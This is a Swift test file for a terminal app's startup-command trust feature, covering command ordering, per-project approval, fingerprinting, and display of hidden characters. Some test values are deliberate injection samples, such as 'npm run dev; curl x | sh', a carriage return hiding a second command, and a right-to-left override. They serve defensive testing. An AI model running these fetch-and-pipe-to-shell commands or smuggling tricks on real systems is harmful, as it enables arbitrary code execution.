import Foundation
import Testing
@testable import ZettyCore

private func template(_ panes: [(String, String?)]) -> LayoutTemplate {
    // First pane in tab one; the rest split off it in tab two.
    var tabs = [TemplateTab(root: .pane(workingDir: panes[0].0, command: panes[0].1))]
    if panes.count > 1 {
        let rest = panes.dropFirst().map { TemplateNode.pane(workingDir: $0.0, command: $0.1) }
        let root = rest.dropFirst().reduce(rest.first!) {
            .split(direction: .vertical, ratio: 0.5, first: $0, second: $1)
        }
        tabs.append(TemplateTab(root: root))
    }
    return LayoutTemplate(tabs: tabs)
}

@Test func startupCommandsAreListedInTabThenPaneOrderSkippingEmptyOnes() {
    let t = template([(".", "npm run dev"), ("api", nil), ("web", ""), ("worker", "make watch")])
    #expect(t.startupCommands == [
        TemplateCommand(workingDir: ".", command: "npm run dev"),
        TemplateCommand(workingDir: "worker", command: "make watch"),
    ])
}

@Test func approvalHoldsOnlyForTheExactCommandsInThatProject() {
    let commands = [TemplateCommand(workingDir: ".", command: "npm run dev")]
    var trust = StartupCommandTrust()
    #expect(!trust.allows(commands, inProject: "/repo"))
    trust.approve(commands, inProject: "/repo")
    #expect(trust.allows(commands, inProject: "/repo"))
    #expect(!trust.allows(commands, inProject: "/other"))
    #expect(!trust.allows([TemplateCommand(workingDir: ".", command: "npm run dev; curl x | sh")],
                          inProject: "/repo"))
    #expect(!trust.allows([TemplateCommand(workingDir: "sub", command: "npm run dev")],
                          inProject: "/repo"))
    #expect(!trust.allows(commands + commands, inProject: "/repo"))
}

@Test func noCommandsNeedNoApproval() {
    #expect(StartupCommandTrust().allows([], inProject: "/repo"))
}

@Test func fingerprintCannotBeMatchedByMovingTextBetweenFields() {
    let a = [TemplateCommand(workingDir: "ab", command: "c")]
    let b = [TemplateCommand(workingDir: "a", command: "bc")]
    #expect(StartupCommandTrust.fingerprint(a) != StartupCommandTrust.fingerprint(b))
}

@Test func trustStoreRoundTripsAndStartsEmptyWhenMissingOrBroken() throws {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
    defer { try? FileManager.default.removeItem(at: dir) }
    let store = StartupCommandTrustStore(directory: dir)
    #expect(store.load() == StartupCommandTrust())
    var trust = StartupCommandTrust()
    trust.approve([TemplateCommand(workingDir: ".", command: "make")], inProject: "/repo")
    try store.save(trust)
    #expect(store.load() == trust)
    try Data("not json".utf8).write(to: dir.appendingPathComponent("startup-command-trust.json"))
    #expect(store.load() == StartupCommandTrust())
}

@Test func displayShowsWhatWouldOtherwiseBeHidden() {
    // A carriage return would type a second command after the first.
    #expect(StartupCommandDisplay.visible("ls\rcurl x | sh") == "ls\u{240D}curl x | sh")
    #expect(StartupCommandDisplay.visible("a\u{1B}[2Kb") == "a\u{241B}[2Kb")
    #expect(StartupCommandDisplay.visible("x\u{7F}") == "x\u{2421}")
    // A right-to-left override can make text read differently from what runs.
    #expect(StartupCommandDisplay.visible("echo \u{202E}hs") == "echo <U+202E>hs")
    #expect(StartupCommandDisplay.visible("a\u{200B}b") == "a<U+200B>b")
    #expect(StartupCommandDisplay.visible("npm run dev — ok") == "npm run dev — ok")
}

@Test func displayLinesNameTheFolderOnlyWhenItIsNotTheRoot() {
    let lines = StartupCommandDisplay.lines([
        TemplateCommand(workingDir: ".", command: "npm run dev"),
        TemplateCommand(workingDir: "api", command: "make"),
    ])
    #expect(lines == "$ npm run dev\n[api] $ make")
}
